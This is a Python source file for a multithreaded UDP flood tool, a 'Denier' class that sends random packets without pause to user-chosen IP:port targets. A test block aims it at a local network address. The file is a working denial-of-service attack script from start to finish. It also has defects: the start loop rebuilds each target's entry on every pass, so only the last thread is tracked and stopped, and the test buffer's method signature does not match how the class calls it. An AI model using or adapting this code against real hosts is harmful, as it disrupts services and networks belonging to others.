import socket
import threading
import random
# from ..data_buffer import DataBuffer

class Denier:
	'''
	UI:

	Label         [_IP:Port_] 
	Status     [ stop/start ]

	The entry is readonly if it's active
	You can add another target and start it while other attacks are active
	You can add multiple targets and start all or start one at a time
	You can stop one at a time or stop all
	therefore a target is only in the dict if it's being started or currently active
	'''
	
	def __init__(self, buffer):
		self.targets = {}
		'''
		"ip_address": {
			"stop_event": threading.stop_event
			"threads": [threading.thread, ...]
		}
		'''
		self.buffer = buffer


	def is_running(self, target: str|None=None):
		'''
		Return if any dos is running, or if the targeted ip is running
		Used to display attack statuses
		'''
		if target is None:
			if len(self.targets.keys()) > 0:
				return True
			else:
				return False
		else:
			if target in self.targets:
				return True
			else:
				return False
	


	def start(self, targets: list[str]):
		'''
		Starts attack(s) on the given target(s)
		'''
		if self.is_running():
			self.buffer.put("dos", "DoS Attack is already running")
			return
		for target in targets:
			if target not in self.targets and len(target) > 0 and len(target.split(":")) == 2:
				try:
					self._start(target)
				except:
					self.buffer.put("dos",f"Error while starting DoS attack on {target}")
			else:
				self.buffer.put("dos", f"Did not start DoS attack on \"{target}\"")


				


	def _start(self, target: str):

		def job(target: str, job_number: int):
		# Author: M-Taghizadeh (http://m-taghizadeh.ir)

			address = target.split(":")[0]
			port = int(target.split(":")[1])
			while not self.targets[target]["stop_event"].is_set():	

				rnd_msg = ""
				for i in range(0, 8):
					ch_rnd = random.randint(0, 255)
					rnd_msg += chr(ch_rnd)
				message = str.encode(rnd_msg)
				sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				sock.sendto(message, (address, port))
			# Job stopped

		# create threads
		number_of_attacks = 4
		for i in range(number_of_attacks):
			self.targets[target] = {
				"stop_event": threading.Event(),
				"threads": []
			}
			t = threading.Thread(target=job, args=(target, i), daemon=True)
			self.targets[target]["threads"].append(t)
			t.start()
		self.buffer.put("dos", f"Started {number_of_attacks} DoS attack threads on {target}")

	def stop(self, target_ip: str|None=None):
		'''
		Stops attack(s) on the given target(s)
		'''
		if not self.is_running(target_ip):
				self.buffer.put("dos", "DoS Attack is not running")
				return
		if target_ip is None:
			for target in self.targets.keys():
				self._stop(target)
			self.targets = {}
		else:
			self._stop(target_ip)
			del self.targets[target_ip]


	def _stop(self, target: str):
		data = self.targets.get(target)
		if not data:
			return

		data["stop_event"].set()

		for t in data["threads"]:
			t.join(timeout=1)

		self.buffer.put("dos", f"Stopped DoS attack on {target}")


if __name__ == "__main__":
	
	class Buffer:
		def __init__(self):
			...

		def put(self, s, t, r):
			print(r)
	buffer = Buffer()
	dos = Denier(buffer)

	target = input("Type ip - system76: 114, asus: 231")
	dos.start([f"192.168.8.{target}:200"])

	input("Press enter to stop")

	dos.stop()

